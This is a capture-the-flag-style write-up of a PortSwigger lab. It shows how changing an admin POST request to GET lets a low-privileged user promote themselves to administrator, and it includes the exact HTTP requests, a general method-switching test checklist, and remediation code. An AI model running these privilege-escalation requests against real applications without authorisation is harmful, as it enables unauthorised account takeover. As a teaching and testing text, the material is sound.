# PortSwigger Lab: Method-Based Access Control Bypass

**Author:** Neelesh Pandey  
**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Practitioner  
**Category:** Access Control / Privilege Escalation  
**Lab:** Method-based access control can be circumvented  

---

## Overview

This lab demonstrates how access controls implemented only on specific HTTP methods can be bypassed by switching to an alternative method. The application correctly blocks `POST` requests from non-admin users but fails to apply the same restrictions to `GET` requests — allowing a low-privileged user to perform admin-only actions simply by changing the HTTP method.

---

## The Vulnerability

Access control was implemented for `POST /admin-roles` but not for `GET /admin-roles`. The server checks authorisation on the POST method but processes the GET method without the same validation.

```
POST /admin-roles  → checks authorisation → blocks non-admin → 401 Unauthorized
GET  /admin-roles  → no authorisation check → executes action → 200 OK
```

This is a common misconfiguration in applications where access controls are applied per-method rather than per-endpoint.

---

## Methodology

```
Understand admin action → Capture POST request →
Test with non-admin session → Identify method restriction →
Switch to GET method → Change username → Privilege escalation
```

---

## 1. Reconnaissance — Admin Panel

### Step 1 — Capture Admin Action

Logged in as `administrator:admin`. Navigated to admin panel and promoted `carlos`. Captured the `POST /admin-roles` request in Burp Repeater:

```http
POST /admin-roles HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<admin-session>
Content-Type: application/x-www-form-urlencoded

username=carlos&action=upgrade
```

---

## 2. Test Non-Admin Access

### Step 2 — Replace Session Cookie

Logged in as `wiener:peter` in a private browser window. Copied wiener's session cookie into the existing Repeater request:

```http
POST /admin-roles HTTP/2
Cookie: session=<wiener-session>   ← replaced with non-admin cookie

username=carlos&action=upgrade
```

**Response:** `401 Unauthorized` — POST method correctly blocked for non-admin users.

### Step 3 — Probe Method Handling

Changed method to an invalid value `POSTX`:

```http
POSTX /admin-roles HTTP/2
Cookie: session=<wiener-session>
```

**Response:** `"missing parameter"` — different error. The server is now processing the request differently — access control check not triggered for unknown methods.

---

## 3. Exploitation — Method Switch to GET

### Step 4 — Convert to GET

Right-clicked request in Repeater → "Change request method" → converted to GET. Burp automatically moved body parameters to the URL query string:

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Cookie: session=<wiener-session>
```

### Step 5 — Promote Self

Changed `username` parameter from `carlos` to `wiener`:

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<wiener-session>
```

**Response:** `200 OK` — wiener promoted to administrator. Lab solved.

---

## 4. Attack Flow Summary

```
Admin promotes carlos via POST /admin-roles → request captured
        ↓
Replace admin session with wiener session
POST /admin-roles → 401 Unauthorized (POST blocked for non-admin)
        ↓
Change method to POSTX → "missing parameter" (different response)
Access control not triggered for unknown method
        ↓
Change method to GET → parameters move to query string
GET /admin-roles?username=wiener&action=upgrade → 200 OK
        ↓
Wiener promoted to admin → lab solved
```

---

## 5. Why This Works

The application has method-specific access control — it checks authorisation for POST requests but not GET requests to the same endpoint. This is a common pattern when developers implement access control in middleware or framework route handlers that only intercept specific HTTP methods.

```
// Vulnerable implementation (pseudocode)
if (request.method == "POST" && !isAdmin(user)) {
    return 401;
}
// No check for GET method — falls through to execute action
executeAction(request.params);
```

The `POSTX` test is important — it reveals the access control is method-specific because the response changes to a processing error rather than an authorisation error, confirming the check was bypassed.

---

## 6. Key Takeaways

- **Access controls must be applied per-endpoint not per-method** — any HTTP method that reaches the action should require the same authorisation
- **POSTX test reveals method-specific controls** — changing to an invalid method and getting a different response (processing error vs auth error) confirms the access control is method-dependent
- **GET requests can carry parameters** — moving parameters from POST body to GET query string is trivial in Burp; never assume GET requests are "read-only" in terms of access control
- **Always test alternative HTTP methods** — GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS on sensitive endpoints; access controls are often inconsistent across methods
- **Burp's "Change request method"** — automatically converts POST body parameters to GET query string parameters; essential for method-switching attacks

---

## 7. Real-World Testing

On any access-controlled endpoint, always test:

```
Original: POST /admin/action → 403 Forbidden
Test 1:   GET /admin/action?<params> → ?
Test 2:   PUT /admin/action → ?
Test 3:   PATCH /admin/action → ?
Test 4:   POSTX /admin/action → ? (different error = method-specific control)
```

If any alternative method returns a different response than the authorisation error — access control bypass likely.

---

## 8. Remediation

| Finding | Risk | Fix |
|---------|------|-----|
| Access control only on POST | Critical | Apply authorisation checks at endpoint level — enforce for ALL HTTP methods |
| GET request executes state change | High | GET requests should be read-only — use POST/PUT/PATCH for state-changing actions |
| No method validation | Medium | Reject or return 405 Method Not Allowed for unexpected HTTP methods |

**Secure implementation:**
```python
# WRONG — method-specific check
@app.route('/admin-roles', methods=['GET', 'POST'])
def admin_roles():
    if request.method == 'POST' and not current_user.is_admin:
        return 401

# CORRECT — endpoint-level check
@app.route('/admin-roles', methods=['GET', 'POST'])
@require_admin   # applied regardless of method
def admin_roles():
    ...
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite Professional | Proxy, Repeater |
| Burp "Change request method" | Automatic POST → GET conversion |

---

## References

- [PortSwigger — Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
- [OWASP — Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)

---

*Write-up by Neelesh Pandey — [GitHub](https://github.com/Neelesh707) | [LinkedIn](https://www.linkedin.com/in/neelesh-pandey021/)*
